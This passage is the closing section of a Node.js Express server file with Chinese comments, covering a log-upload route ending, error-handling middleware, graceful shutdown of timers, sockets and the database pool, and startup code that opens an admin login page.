    const result = await alistClient.uploadFile(logDir, filename, req.body.toString());
    res.json(result);
}));

// 统一错误处理中间件
app.use((err, req, res, next) => {
    logger.error('API 错误', { url: req.url, error: err.message, stack: err.stack });
    res.status(err.status || 500).json({
        error: err.message || '服务器内部错误',
        ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    });
});

// 关机
let shuttingDown = false;

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    if (shuttingDown) {
        return;
    }
    shuttingDown = true;
    logger.info('开始关机...');
    clearInterval(clientManager.heartbeatTimer);
    clearInterval(clientManager.reconnectTimer);

    if (clientManager.tcpServer) {
        clientManager.tcpServer.close();
    }
    wss.clients.forEach(ws => ws.terminate());
    server.close(async () => {
        logger.info('HTTP 服务器已关闭');
        await pool.end();
        logger.info('数据库连接池已关闭');
        process.exit(0);
    });
}

// 启动服务
(async () => {
    try {
        await clientManager.init();
        server.listen(CONFIG.httpPort, () => {
            logger.info(`HTTP 服务运行在端口 ${CONFIG.httpPort}`);
            const url = `http://localhost:${CONFIG.httpPort}/login.html`;
            logger.info(`访问 ${url} 打开管理界面`);
            if (process.env.NODE_ENV !== 'test') {
                open(url).catch(err => logger.warn('自动打开浏览器失败', { error: err.message }));
            }
        });
    } catch (err) {
        logger.error('服务启动失败', { error: err.message, stack: err.stack });
        process.exit(1);
    }
})();